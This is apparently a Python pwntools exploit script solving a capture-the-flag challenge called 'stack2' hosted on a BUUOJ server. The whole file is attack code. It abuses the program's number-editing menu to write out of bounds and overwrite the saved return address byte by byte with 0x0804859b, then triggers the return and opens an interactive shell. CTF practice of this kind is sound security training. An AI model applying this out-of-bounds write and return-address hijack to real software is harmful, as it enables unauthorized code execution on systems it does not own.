#!/usr/bin/env python
# coding=utf-8
from pwn import *

context.arch = 'i386'

local = 0
if local == 1:
    r=process('./stack2')
    #gdb.attach(r,'b * 0x080488F2')
else:
	r = remote('node4.buuoj.cn',26367)

elf = ELF('./stack2')

def cgnum(index,num):
    r.recvuntil(' exit')
    r.sendline('3')
    r.recvuntil('change:')
    r.sendline(str(index))
    r.recvuntil('number:')
    r.sendline(str(num))

r.recvuntil('have:')
r.sendline('1')
r.recvuntil('numbers')
r.sendline('1')
cgnum(104+28,0x9b)
cgnum(105+28,0x85)
cgnum(106+28,0x4)
cgnum(107+28,0x8)

r.recvuntil(' exit')
r.sendline('5')

r.interactive()
